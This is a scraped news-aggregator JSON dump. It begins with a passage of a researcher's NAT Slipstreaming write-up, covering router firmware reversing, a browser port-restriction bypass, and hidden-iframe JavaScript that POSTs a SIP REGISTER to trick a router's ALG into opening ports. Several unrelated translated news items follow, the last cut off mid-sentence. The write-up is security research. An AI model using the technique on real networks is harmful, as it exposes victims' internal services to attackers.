exact TCP segment size / packet boundary, then “SIP packet” appended and posted via web form\n victim IP stack breaks POST into multiple TCP packets, leaving &#34;SIP packet&#34; (as part of POST data) in its own TCP packet without any HTTP headers\n if browser alters size of multipart/form boundary (Firefox) or packet size changes for any other reason, size change is communicated back to client and client auto-resends with new size\n when opening UDP port, SIP packet is sent over TURN protocol inside specially crafted  username field forcing IP fragmentation and precise boundary control\n victim NAT sees proper SIP REGISTER packet on SIP port (with no HTTP data), triggering ALG to open any TCP/UDP port defined in packet back to victim victim NAT rewrites SIP packet, replacing internal IP with public IP, hinting to attacker exploit was successful\n even if victim NAT normally rewrites source ports, the ALG will still be forced to port forward to the attacker&#39;s port of choice as it believes victim machine opened that port and attacker sees new source port in arriving SIP packet\n attacker can now bypass victim NAT and connect directly back to any port on victim&#39;s machine, exposing previously protected/hidden services\n    We use NATs (Network Address Translation) for several reasons. The most useful feature of NAT is that it allows a single public IP address to be shared among multiple systems. It does this by creating a local network, providing local IP addresses to all machines that connect, and when one of those systems reaches out to the Internet, it rewrites packets going out to use the public IP so responses come back to the NAT, and vice versa, rewriting desination IP to specific client&#39;s IP.\n It&#39;s the responsibility of the NAT to differentiate connections to the same addresses/ports (google.com:443) from internal hosts as ultimately their outbound port, destination ip and source ip will all be the same. If two different internal peers attempt to connect from the same source port, modern NATs will alter one of the source ports (some networks do this to all TCP/UDP source ports).\n    One of the important features built on top of the Netfilter framework is connection tracking. Connection tracking allows the kernel to keep track of all logical network connections or sessions, and thereby relate all of the packetswhich may make up that connection. NAT relies on this information to translate all related packets in the same way, and iptables can use this information to act as a stateful firewall.\n If a machine behind your NAT sends a packet out and your router expects the remote host may respond, it keeps track of information, specifically the source and destination ports, source and destination IP addresses, and your internal IP, then returns any packets matching it back to your internal IP.\n If another host on your LAN attempts to make the same connection with the same source and destination ports + IPs, your NAT wouldn&#39;t be able to discriminate it, so it alters the source port, but rewrites it when sending back to you.\n  ALGs allow NAT to track a multi-port protocol like FTP to go out from your system to an FTP server, then track when you request a file to be sent to your internal IP on a specific port, the ALG can rewrite the packet to include your public IP, then forward the FTP&#39;s server connection back to you. Had it not rewritten your IP, the FTP server would try to connect back to you on your internal IP (or not try at all if it expects the source IP to be the same as the signaling connection).\n  In the context of computer networking, an application-level gateway consists of a security component that augments a firewall or NAT employed in a computer network. It allows customized NAT traversal filters to be plugged into the gateway to support address and port translation for certain application layer &#34;control/data&#34; protocols such as FTP, BitTorrent, SIP, RTSP, file transfer in IM applications, etc. In order for these protocols to work through NAT or a firewall, either the application has to know about an address/port number combination that allows incoming packets, or the NAT has to monitor the control traffic and open up port mappings (firewall pinhole) dynamically as required. Legitimate application data can thus be passed through the security checks of the firewall or NAT that would have otherwise restricted the traffic for not meeting its limited filter criteria.\n  I&#39;d first like to see how common gateways actually treat packets and multi-port protocols like FTP, SIP, etc. To do this, we’ll want to reverse engineer the firmware from common routers. We could dump the flash from physical routers, however if we can get unencrypted firmware from the manufacturers, we’ll be able to investigate more router models and much faster.\n We&#39;ll start with a common router, the Netgear Nighthawk R7000. A  quick search helps us find a  Netgear article with  recent firmware. Once we download the firmware and unzip, we find a 30MB file called R7000-V1.0.9.64_10.2.64.chk.\n tigerblood:~c/ng$ wget http://www.downloads.netgear.com/files/GDC/R7000/R7000-V1.0.9.64_10.2.64.zip--2019-05-19 19:21:13-- http://www.downloads.netgear.com/files/GDC/R7000/R7000-V1.0.9.64_10.2.64.zipResolving www.downloads.netgear.com (www.downloads.netgear.com)... 104.69.65.243Connecting to www.downloads.netgear.com (www.downloads.netgear.com)|104.69.65.243|:80... connected.HTTP request sent, awaiting response... 200 OKLength: 31705064 (30M) [application/zip]Saving to: ‘R7000-V1.0.9.64_10.2.64.zip’R7000-V1.0.9.64_10.2.64.zip 100%[=============================================&gt;] 30.24M 6.25MB/s in 11s2019-05-19 19:21:24 (2.83 MB/s) - ‘R7000-V1.0.9.64_10.2.64.zip’ saved [31705064/31705064]tigerblood:~c/ng$ unzip R7000-V1.0.9.64_10.2.64.zipArchive: R7000-V1.0.9.64_10.2.64.zip extracting: R7000-V1.0.9.64_10.2.64.chk inflating: R7000-V1.0.9.64_10.2.64_Release_Notes.htmltigerblood:~c/ng$ file R7000-V1.0.9.64_10.2.64.chkR7000-V1.0.9.64_10.2.64.chk: datatigerblood:~c/ng$ ls -lh R7000-V1.0.9.64_10.2.64.chk-rw-r--r-- 1 samy staff 30M Mar 26 11:46 R7000-V1.0.9.64_10.2.64.chk\n  The  file command doesn&#39;t detect any  magic info, so we can use   binwalk to scan the file for nested data.\n tigerblood:~c/ng$ binwalk R7000-V1.0.9.64_10.2.64.chkDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------58 0x3A TRX firmware header, little endian, image size: 31703040 bytes, CRC32: 0xBEF1BB2F, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21E3F0, rootfs offset: 0x086 0x56 LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5436416 bytes2221098 0x21E42A Squashfs filesystem, little endian, version 4.0, compression:xz, size: 29475437 bytes, 1988 inodes, blocksize: 131072 bytes, created: 2018-12-26 04:15:38\n  I use macOS and binwalk depends on some Linux apps out of the box which would cause  binwalk -e (which extracts files) to fail so I extract manually (and I &lt;3 perl golf).\n   You could use  dd, however you&#39;d want a large  bs (block size) so that it would output quickly, eg 1024, however the  skip attribute (to tell it to start at the location of the squashfs blob) would respect the block size and 2221098 isn’t obviously divisible in anything quickly in my head other than 2…now I’m curious.\n tigerblood:~c/ng$ time dd if=R7000-V1.0.9.64_10.2.64.chk skip=$((2221098/2)) bs=2 of=squash.fs214741000+0 records in14741000+0 records out29482000 bytes transferred in 78.363403 secs (376222 bytes/sec)real 1m18.385suser 0m12.553ssys 1m4.451s\n Now let&#39;s unpack the squash filesystem. I’ve created a  fork of a fork of squashfs-tools that runs on macOS and has  lzo support. You may need to install  xz and  lzo as well. Alternatively, you could use   sasquatch on Linux.\n tigerblood:~c/ng$ sudo port install xz lzo...tigerblood:~c/ng$ git clone https://github.com/samyk/squashfs-tools &amp;&amp; cd squashfs-tools/squashfs-tools &amp;&amp; make &amp;&amp; sudo make install &amp;&amp; cd ../..\n  tigerblood:~c/ng$ unsquashfs -l -no squash.fsParallel unsquashfs: Using 8 processors1881 inodes (2535 blocks) to writesquashfs-rootsquashfs-root/binsquashfs-root/bin/addgroup... (many more files) ...tigerblood:~c/ng$ cd squashfs-root &amp;&amp; lsbin data dev etc lib media mnt opt proc sbin share sys tmp usr var www\n    Now let&#39;s see if we can find any files relevant to FTP as it was a heavily used protocol so ALG support will be rampant across routers. I use my   g tool which is just a convenient wrapper around  egrep.\n  Nothing interesting, so let&#39;s  g for binary files whose content matches /ftp/, ignoring some files we don’t care about.\n  g recursively scans the current working directory by default.  -l is to only print file names (as these will be mostly binary),  -a to scan binary files,  ftp for text to match, and  -v &#39;\\.(html?|js|gif)$|www/|bin/&#39; to ignore web files and executables (sitting in (s)bin/).\n    Okay, two files of interest –  lib/modules/tdts.ko could be related, and  lib/modules/2.6.36.4brcmarm+/kernel/lib/br_dns_hijack.ko is probably not related but sounds interesting! May investigate that later.\n tigerblood:~c/ng/squashfs-root$ file lib/modules/tdts.kolib/modules/tdts.ko: ELF 32-bit LSB relocatable, ARM, EABI5 version 1 (SYSV), BuildID[sha1]=0aa35748e245e60273ceb5a48641e424d069235b, not strippedtigerblood:~c/ng/squashfs-root$ strings lib/modules/tdts.ko | g ftpftp_decoder_openftp_decoder_closeftp_decode_epsv_respftp_decode_eprt_cmdftp_decode_pasv_respftp_decodeftp_decode_port_cmdftp_decodercheck_ftp_ft_rule\n Nice! A kernel object (.ko) with ftp functions, and with words like &#34;port&#34;, it&#39;s likely related to an FTP ALG. The  FTP RFC 959 explains the meaning of the  PORT command:\n DATA PORT (PORT)The argument is a HOST-PORT specification for the data portto be used in data connection. There are defaults for boththe user and server data ports, and under normalcircumstances this command and its reply are not needed. Ifthis command is used, the argument is the concatenation of a32-bit internet host address and a 16-bit TCP port address.This address information is broken into 8-bit fields and thevalue of each field is transmitted as a decimal number (incharacter string representation). The fields are separatedby commas. A port command would be: PORT h1,h2,h3,h4,p1,p2where h1 is the high order 8 bits of the internet hostaddress.\n  While we&#39;ve found some FTP functions, we’re more interested in ports that we can use. Modern browsers prevent outbound HTTP(S) connections to a number of  restricted ports, including FTP, so abusing the FTP ALG is likely a no-go.\n In 2010, when I  first demonstrated NAT Pinning, I used port 6667 (IRC) via the DCC CHAT/FILE messages. Quickly, browser vendors blocked port 6667…though some used a uint32 (32 bit unsigned integer) to store the port, check if the port was blocked, and if not, connect. To evade this, it&#39;s important to note TCP ports are 16 bits long, so if you add 2**16 (65536) to the &#34;restricted&#34; port of choice, in this case 65536+6667=72203, the browser would store 72203, it would pass the port restriction (72203 != 6667), then would get sent off to the TCP stack where it gets truncated to 16 bits which is the restricted port we wanted!\n   We can see it better using my   diffbits tool, a simple tool for viewing similarities and differences between bit strings, as well as between multiple groups of bit strings, useful for reversing proprietary, binary protocols.\n   Go ahead and open your disassembler of choice. I&#39;ve used  Ghidra from our friends at the  NSA as it’s free and open source.\n Some of the functions we saw in  tdts.ko via  strings was  ftp_decode and  ftp_decoder, so it&#39;s possible other ALGs will have a  _decode function. Let’s look…\n    Checking our  restricted browser ports, we see 5060, the default SIP port, is not restricted in Chrome :)\n  SIP lives on TCP/UDP 5060, but media like RTP (audio) is sent on alternate ports that are generated on the fly. When sending a request for a SIP call, your SIP client chooses a random port, opens it, and includes it in the SIP header. Your NAT should also see it and open it up, assuming the SIP ALG is enabled (and is on most routers by default).\n Assuming NATs reader SIP packets line by line (SIP is newline-based like HTTP and is not a binary protocol), perhaps it will ignore the HTTP header and once it gets to the POST data, read the REGISTER and believe it&#39;s a SIP packet. This worked in our 2010 version for the IRC DCC. The NAT ignored the HTTP header and just parsed the IRC DCC command.\n Funny thing, this also allowed us to actually make users who visit our site connect to a  legitimate IRC server, join a channel, and send a message from their IP without them knowing! :P I demo&#39;d this technique fo sending email to mail servers with client IP addresses before port 25 was blocked by browsers and before SPF records were common…craziness.\n Now, in a quick test, sending a SIP REGISTER packet over port 5060 through an HTTP POST doesn&#39;t seem to work…perhaps we’re missing something from the packet.\n // our sip messagevar sipmsg = &#39;REGISTER sip:samy.pl;transport=TCP SIP/2.0\\r\\n&#39; + &#39;Contact: &lt;sip:samy@192.168.0.109:1234;transport=TCP&gt;\\r\\n\\r\\n&#39;// load form in an iframe so user doesn&#39;t se itvar iframe = document.createElement(&#39;iframe&#39;)iframe.name = &#39;iframe&#39;iframe.style.display = &#39;none&#39; // hide the iframe// create formvar form = document.createElement(&#39;form&#39;)form.setAttribute(&#39;target&#39;, &#39;iframe&#39;) // load into iframeform.setAttribute(&#39;method&#39;, &#39;POST&#39;) // need the POST area where we can add CRLFsform.setAttribute(&#39;action&#39;, &#39;http://samy.pl:5060&#39;) // &#34;http&#34; server on SIP port 5060form.setAttribute(&#39;enctype&#39;, &#39;multipart/form-data&#39;) // ensure our data doesn&#39;t get encodedvar textarea = document.createElement(&#39;textarea&#39;)textarea.setAttribute(&#39;name&#39;, &#39;textname&#39;) // requiredtextarea.innerHTML = sipmsgform.appendChild(textarea)document.body.appendChild(iframe)document.body.appendChild(form)form.submit()\n  $ unbuffer tcpdump -X port 5060 | h2bPOST / HTTP/1.1Host: samy.pl:5060Connection: keep-aliveContent-Length: 191Cache-Control: max-age=0Origin: http://samy.plUpgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhcoAd2iSAx3TJA7AUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.66 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Referer: http://samy.pl/o/sp.htmlAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9------WebKitFormBoundaryhcoAd2iSAx3TJA7AContent-Disposition: form-data; name=&#34;textname&#34;REGISTER sip:samy.pl;transport=TCP SIP/2.0Contact: &lt;sip:samy@192.168.0.109:1234;transport=TCP&gt;------WebKitFormBoundaryhcoAd2iSAx3TJA7A--\n However, this doesn&#39;t open the port, nor is the IP rewritten which we’d expect (more on this later), so we must be missing something.\n  Let&#39;s keep digging in the kernel object. In the diassembly, we see the &#34;SIP/2.0&#34; tag from a SIP packet, so it’s likely parsing here (which “decode” sounds like).\n  Ah, this is why we fail. Looks like it&#39;s running strncasecmp on  INVITE (similar parsing on REGISTER) – matching (case-insensitive, which is interesting as SIP INVITEs are upper case) the word &#34;INVITE&#34; at the beginning of the packet and  branches if  not  equal (ARM assembly  bne) to 0, so if the words do match, the lexicographical order will be 0 and we’ll continue to  ct_sip_get_header which sounds fun, and seems to bail otherwise.\n This is the problem…while we can use a web browser to produce outbound sockets (TCP via HTTP(S), UDP via TURN w/WebRTC), we don&#39;t have enough control over the browser to start the TCP data portion with the word &#34;INVITE&#34;, which this module expects. In the  2010 IRC version, the IRC ALG only looked line by line, ignoring all the HTTP header data, then using newlines in the POST data to send a valid “IRC DCC”. However, this SIP ALG is much more strict and controlling the beginning of the request is not possible. If using TLS,\n......", "posttime": "2020-11-01 07:36:54", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "nat,端口", "title": "NAT滑流", "title_en": "Nat Slipstreaming", "transed": 1, "url": "https://samy.pl/slipstream/", "via": "", "real_tags": ["nat", "端口"]}, {"category": "", "categoryclass": "", "imagename": "5fb97950a24b830f1dc4645a5e59e8fb.jpg", "infoid": 1032559, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "18年来，我们一起在阿姆斯特丹庆祝我们对Blender的热情，分享工作，与旧的(和新的)一起度过一段美好的时光！弗雷..。", "note_en": "For 18 years we have come together in Amsterdam to celebrate our passion for Blender, to share work and have a good time hanging out with old (and new!) frie...", "posttime": "2020-11-01 07:35:27", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "搅拌机,blender,庆祝", "title": "BCON20-搅拌机大会：一起分开", "title_en": "BCON20 – Blender Conference: Together Apart", "transed": 1, "url": "https://www.youtube.com/watch?v=uEjmbsiflMU&ab_channel=Blender", "via": "", "real_tags": ["搅拌机", "blender", "庆祝"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1032556, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "在街上骑车时，我通常可以根据它们的“肢体语言”来判断我前面的车要做什么：它们是如何在自己的车道上定位的。我不知道我能不能很清楚地说出规则是什么，但我可以说出正在发生的事情，我知道我能说出来，因为我在脑海里做出了预测，然后这些预测被汽车的实际表现所证实。(是的，可能存在选择偏差，所以如果我真的想确认，我应该记录我的猜测并检查错误率。随便了。)。\n不管怎样，前几天我在想，这怎么会是机器学习的一个例子。没有因果推断(抱歉，朱迪亚！)，只是纯粹的预测，而是“机器学习”，因为在过去的几十年里，我的大脑被动地收集关于汽车定位的数据，并在某个时候决定将其与驾驶决策联系起来。我猜这是因为我试图弄清楚在特定情况下该去哪里。因此，在许多方面，这正是我们在讨论人工智能时听到的那种问题，通常的步骤如下：\n3.有定义类别的监督学习一旦我意识到之前我一直在被动地进行分类，\n4.改进：一旦我知道了这个推理过程的参数，我就可以使用更积极的过程来标记错误分类和模棱两可的预测，并使用这些来改进我的预测(“诊断”和“评估”)。\n我在其他问题上读到过这些步骤，从图像识别到犯罪检测。但不知何故，在这个日常例子的背景下，这一切对我来说都变得更加真实。特别是，我知道不同的步骤，从被动的数据收集到通过有意识地使用和改进程序来无意识地识别模式。\n这也让我震惊，意识(对人类和动物来说)和，嗯，我不知道该怎么称呼它之间有一个类比。。。也许是机器学习中的“主动编程”。\n换句话说。统计方法在构建时是完全有意识的：设计、测量、数据收集、推理：这些都是用户必须选择解决的问题。某些统计程序已经足够自动化，可以在不知不觉中应用：例如，计算机可以计算所有变量对之间的相关性，查看分布和扫描异常值，等等，就像人类或动物的视觉系统可以发现异常，而不是有意识地选择寻找它们一样。\n机器学习略有不同。有很多有意识的机器学习过程-用于预测、分类、推理、决策等的各种非参数算法：基本上，这些是统计方法，但我们可能称它们为“机器学习”，因为它们是新的，或者因为它们是非参数的，或者因为它们是由计算机科学家而不是统计学家开发的，或者因为它们与大数据一起工作，等等。但是机器学习和人工智能也与自动的或后台的或无意识的过程相关联，例如在头脑中没有特定目标的大数据的处理(当然，你可能会争辩说，像综合社会调查这样的项目也有这种感觉)，或者在背景中寻找模式，就像我的大脑在汽车定位问题上所做的那样。\n附注：以上是我的猜测和散漫的想法。很可能会有一部关于这一切的文献。如果是这样的话，请在评论中随时通知我。", "note_en": "Riding on the street, I can usually tell what cars in front of me are going to do, based on their “body language”: how they are positioning themselves in their lane. I don’t know that I could quite articulate what the rules are, but I can tell what’s going on, and I know that I can tell because I make predictions in my mind which are then confirmed by what the cars then actually do. (Yes, there could be selection bias, so if I really wanted to check for sure, I should record my guesses and check the error rate. Whatever.)\n Anyway, the other day I was thinking about how this is an example of machine learning. No causal inference (sorry, Judea!), just pure prediction, but “machine learning” in that my brain has passively gathering data on car positioning for the past few decades, and at some point it decided to associate that with driving decisions. I guess it was motivated by me trying to figure out where to go in particular situations. So in many ways this is exactly the kind of problem we’ve been hearing about in discussions of artificial intelligence, with the usual steps:\n   3. Supervised learning with defined categories once I become conscious of the categorization that I’ve been doing passively until then,\n 4. Refinement: Once I’m aware of the parameters of this inference process, I can use more active processes to flag the misclassifications and ambiguous predictions and use these to refine my predictions (“diagnostics” and “evaluation”).\n I’ve read about these steps in other problems, from image identification to crime detection. But somehow it all becomes more real to me in the context of this everyday example. In particular, I’m aware of the different steps, from passive data collection to the unconscious identification of a pattern through conscious use and refinement of the procedure.\n It also strikes me that there is an analogy between consciousness (for humans and animals) and, hmmm, I don’t know what to call it . . . maybe “active programming” in machine learning.\n Let me put it another way. Statistical methods when constructed are entirely conscious: design, measurement, data collection, inference: these are all problems that the user must choose to solve. Certain statistical procedures have been automated enough that they could be applied unconsciously: for example, a computer could compute correlations between all pairs of variables, look at distributions and scan for outliers, etc., in the same way that human or animal visual systems can find anomalies without the conscious choice to look for them.\n Machine learning is a little different. There are lots of conscious machine learning procedures—various nonparametric algorithms for prediction, classification, inference, decision making, etc.: basically, these are statistical methods, but maybe we call them “machine learning” because they are new, or because they are nonparametric, or because they’ve been developed by computer scientists rather than statisticians, or because they work with big data, etc. But machine learning and AI are also associated with automatic or background or unconscious processes, such as processing of big data without specific goals in mind (sure, you could argue that projects such as the General Social Survey have this feel to them too) or looking for patterns in the background such as my brain did with the car positioning problem.\n P.S. The above are my conjectures and loose thoughts. There could well be a literature on all of this. If so, feel free to inform me about it in the comments.", "posttime": "2020-11-01 07:07:26", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "语言,language,预测", "title": "肢体语言与机器学习", "title_en": "Body Language and Machine Learning", "transed": 1, "url": "https://statmodeling.stat.columbia.edu/2020/10/25/body-language-and-machine-learning/", "via": "", "real_tags": ["语言", "language", "预测"]}, {"category": "", "categoryclass": "", "imagename": "3d77d6aba6fb8d45803bde6f5d175e93.png", "infoid": 1032555, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "得克萨斯州奥斯汀-在许多职业(如法律)中，按工作时间支付员工工资是一项历史悠久的传统。但是，随着新冠肺炎的大流行导致许多工作场所规范被重新审视，德克萨斯大学奥斯汀分校的最新研究表明，根据员工的成就而不是工作时间来补偿员工会产生更好的结果。\n当有表现优劣员工的组织以工作时间作为奖励基础时，所有员工都认为薪酬不公平，最终他们在工作上投入的精力更少。表现优秀的人讨厌比表现不佳的同龄人做更多的工作，同时获得同样的奖励。表现不佳的人认为，尽管他们不管怎样都会得到补偿，但他们会承担起表现超群的同事的重任。\n德州大学奥斯汀分校麦库姆斯商学院会计学助理教授埃里克·陈(Eric Chan)表示，这种“长时间工作文化”是一种普遍现象，尤其是在美国。陈瑞克与德克萨斯州麦库姆斯大学兰德尔·B·麦克唐纳会计学教授史蒂夫·凯尔迈尔(Steve Kchermeier)和康奈尔大学(Cornell University)会计学助理教授张新宇(音译)共同撰写了这一报告。\n陈冯富珍说：“我们发现，对于能力差异很大的工人来说，这些政策会导致非常强烈的不公平和怨恨情绪，你会得到适得其反的效果。”“不过，对于拥有类似能力的员工，我们没有发现这种不利影响。”\n在最初的实验中，Chan和他的同事们让一所大型公立大学的142名商科本科生完成几轮拼字游戏，其中单词或短语中的字母被重新排列，以形成其他单词或短语。\n参与者参与了一轮练习，以评估他们的能力，然后研究人员匿名将他们配对到两人的“公司”中。每一对都有一名高能力工人和一名低能力工人。在练习轮和随后的每一轮之后，研究人员都会告诉学生他们的搭档表现如何。\n每个学生都独立完成了谜题，每个正确解决的谜题都会让两人赢得400里拉，这是一种虚构的货币，研究人员以1000里拉兑1美元的汇率将其兑换成美元。赚到的钱进入了一个共享的锅中。\n一组学生根据每个人玩拼图的时间分享罐子。另一位则根据每位团队成员正确回答了多少个谜题来分享这笔钱。研究人员发现，当补偿基于完成谜题所花费的时间时，所有能力的学生付出的努力都较少。\n在第二个实验中，研究人员让学生们自己解决字谜。这些学生全力以赴。研究人员说，研究结果表明，对于员工能力各异的公司来说，灵活的工作时间可能比要求员工打卡更有回报。\n雇主对员工迟到或早退感到沮丧，可能会忍不住制定一项政策，奖励投入更多时间的员工，猜测这项政策将有助于提高底线。“具有讽刺意味的是，这样的政策似乎似乎奏效了，”Kchermeier说。“在时间意义上，你会看到更多的努力。”\n然而，雇主们没有看到的是意想不到的后果。员工可能会士气低落，生产力可能会下降，员工可能会选择另一个给他们更多自由和灵活性的雇主。\n“在美国，我们都在争先恐后地看谁能为这份工作牺牲最多，”卡舍梅尔说。“那就是，‘看看我们工作的时间有多长，工作有多辛苦。’但是，你个人为这份工作牺牲了多少小时，确实会产生负面影响，而且不仅仅是在精疲力竭的情况下。这也是一种怨恨。公司必须提供灵活性，让人们来决定什么是适合他们的。“", "note_en": "AUSTIN, Texas – Paying employees based on hours worked is a time-honored tradition in many professions, such as law. But with the COVID-19 pandemic causing many workplace norms to be revisited,  new research from The University of Texas at Austin suggests that compensating employees based on their accomplishments rather than on hours worked produces better results.\n When organizations with a mix of high- to low-performing employees base rewards on hours worked, all employees see compensation as unfair, and they end up putting in less effort on the job. High performers resent doing more work than their low-performing peers while getting the same reward. Low performers assume their overachieving colleagues will carry the load, while they’re compensated regardless.\n This “long-hours culture” is a common phenomenon, and especially in the U.S., said Eric Chan, assistant professor of accounting in the McCombs School of Business at UT Austin and co-author with Steve Kachelmeier, the Randal B. McDonald Chair in Accounting in Texas McCombs; and Xinyu Zhang, assistant professor of accounting at Cornell University.\n “We found that for workers with very different abilities, these policies lead to feelings of unfairness and resentment that are very strong, and you get a backfire effect,” Chan said. “For employees with similar abilities, though, we don’t find that adverse effect.”\n  In an initial experiment, Chan and colleagues tasked 142 undergraduate business students at a large public university with completing several rounds of anagram puzzles, where the letters in words or phrases are rearranged to form other words or phrases.\n Participants engaged in a practice round to assess their abilities, and then researchers anonymously paired them in two-person “firms.” Each pair had a high-ability worker and low-ability worker. After the practice round and each subsequent round, researchers told students how their partner fared.\n Each student completed the puzzles independently, and each correctly solved puzzle earned the pair 400 lira, a fictional currency that researchers converted into U.S. dollars at a rate of 1,000 lira to $1. Money earned went into a shared pot.\n One set of students shared the pot based on how long each person worked on the puzzles. Another shared the money based on how many puzzles each team member answered correctly. The researchers found that when compensation was based on time spent completing the puzzles, students of all abilities put forth less effort.\n In a second experiment, the researchers had students solve anagrams on their own. These students put in their full effort. The researchers said results suggest that for companies that have workers of varying abilities, flexibility in work hours may pay off more than requiring staff members to punch the clock.\n Employers frustrated with workers coming in late or leaving early may be tempted to institute a policy that rewards employees who put in more hours, surmising the policy will help boost the bottom line. “The irony is that such a policy may appear to work,” Kachelmeier said. “You will see more effort in the sense of time.”\n However, what employers don’t see are the unintended consequences. Workers can get demoralized, productivity can drop, and employees might choose to find another employer that gives them more freedom and flexibility.\n “In the U.S., we’re all racing to see who can sacrifice the most for the job,” Kachelmeier said. “It’s, ‘Look how long and hard we’re working.’ But how much you’re personally sacrificing in hours for the job does have negative consequences, and it’s not just in burnout. It’s also this resentment. Companies have got to give flexibility and let people determine what’s right for them.”", "posttime": "2020-11-01 07:07:01", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "应该,reward,员工", "title": "雇主应该奖励工人的成就，而不是工作时间", "title_en": "Employers Should Reward Workers for Accomplishments, Not Hours Worked", "transed": 1, "url": "https://news.utexas.edu/2020/10/28/employers-should-reward-workers-for-accomplishments-not-hours-worked/", "via": "", "real_tags": ["应该", "reward", "员工"]}, {"category": "", "categoryclass": "", "imagename": "15fa78c8d09d8b30e47163ae4b6e977c.png", "infoid": 1032554, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "焦糖有一个高度表现力的、健全的类型系统，以及一个速度极快的类型检查器。这使您可以通过使用更接近您的域的类型来排除整个错误类，并且在不牺牲开发速度的情况下无畏地重构大量代码。\n为了实现这一点，Caramel实际上是OCaml编译器的后端，因此它重用了整个类型检查堆栈，有超过25年的学术研究和数百万小时的工业使用，并为Erlang提供了一个新的编译目标。\nCaramel运行在Erlang虚拟机上，这可能是世界上最成熟、最可靠的函数式语言运行时。它有内置的错误处理机制，这使得它非常适合构建永远不会停止运行、需要软实时处理大规模并发以及只需要几个工程师就能构建的系统。", "note_en": "Caramel has a  highly expressive, sound type-system, and a blazing fast type-checker. This allows you to rule out entire classes of errors by using types that are closer to your domain, and fearlessly refactor large amounts of code without sacrificing development speed.\n  To achieve this, Caramel is actually  a backend to the OCaml compiler, so it reuses its entire type-checking stack, with well over 25 years and millions of hours of academic research and industrial usage, and provides a new compilation target to Erlang.\n      Caramel runs on the  Erlang virtual machine, which is perhaps the most mature and reliable functional language runtime in the world. It has built-in error handling mechanisms that make it ideal for building systems that should never stop running, that need to handle massive concurrency in soft-real time, and that need to be built by just a handful of engineers.", "posttime": "2020-11-01 07:06:46", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "错误,massively,运行", "title": "Caramel：可大规模扩展，零运行时错误，选择两个", "title_en": "Caramel: Massively scalable, zero runtime errors, choose two", "transed": 1, "url": "https://caramel.abstractmachines.dev/", "via": "", "real_tags": ["错误", "massively", "运行"]}, {"category": "", "categoryclass": "", "imagename": "0e365b76c49a8ca44ea47bf342ed569c.jpg", "infoid": 1032553, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "该文件指出，“阴谋论倾向”使疫苗接种的反对者更容易受到反犹思想的影响。", "note_en": "A “propensity to conspiracy theory\" makes opponents of vaccination more vulnerable to anti-Semitic ideas, the document states.", "posttime": "2020-11-01 06:52:11", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "犹太主义,anti,反犹", "title": "英国报告发现，反犹太主义者的在线论坛是反犹太主义的“温床”", "title_en": "Online forums for anti-vaxxers are ‘hotbeds’ of anti-Semitism, British report finds", "transed": 1, "url": "https://www.jta.org/quick-reads/online-forums-for-anti-vaxxers-are-hotbeds-of-anti-semitism-british-report-finds", "via": "", "real_tags": ["犹太主义", "anti", "反犹"]}, {"category": "", "categoryclass": "", "imagename": "8fda2ced9111a854cf3843cbd0f33a90.jpeg", "infoid": 1032552, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "不列颠哥伦比亚省戴维斯·沃尔夫冈·霍克(Davis Wolfgang Hawke)于2017年被发现死于不列颠哥伦比亚省斯夸米什附近，他是一名已知的新纳粹分子和垃圾邮件发送者。\n在死亡三年多后，一名男子被枪杀，并在不列颠哥伦比亚省斯夸米什附近的一辆烧毁的SUV中被发现，他已被确认为一名美国公民，以传播种族主义和新纳粹意识形态而闻名，并因大规模的垃圾邮件运动而闻名，这场运动导致美国提起1280万美元的诉讼。\n上午9：30左右，警方发现戴维斯·沃尔夫冈·霍克(Davis Wolfgang Hawke)死在天堂谷以东的海天高速公路Cheekye Forest Road上。2017年6月14日。2000年，GMC和育空XL在路边发生了一起烧毁的红色事故，警察们接到了报警。\n后来的尸检证实这名男子是被枪杀的，但加拿大皇家骑警多年来一直无法确认他的真名。\n综合凶杀案调查小组(IHIT)只知道他化名杰西·詹姆斯(Jesse James)，在温哥华以北约50公里的斯夸米什(Squamish)，他作为一名狂热的登山者而闻名。\n但随着IHIT周四确认霍克的身份，多亏了一名调查记者的工作，有关霍克过去的细节-包括他对法西斯主义的同情，以及他建立的一个利润丰厚的垃圾邮件帝国-已经浮出水面，兜售贷款、色情、珠宝和处方药。\n“垃圾邮件之王”(Spam Kings)一书的作者布莱恩·麦克威廉姆斯(Brian McWilliams)花了数年时间追踪这名年轻人，他说这名年轻人过着游牧、冒险的生活。据麦克威廉姆斯说，他经常带着半狼的狗旅行，这似乎是他唯一忠诚的东西。\n这家伙死得不光彩，也许还很暴力，这并不让我感到惊讶。麦克威廉姆斯说，他一直生活在悬崖边上。\n麦克威廉姆斯说，霍克原名安德鲁·布里特·格林鲍姆(Andrew Britt 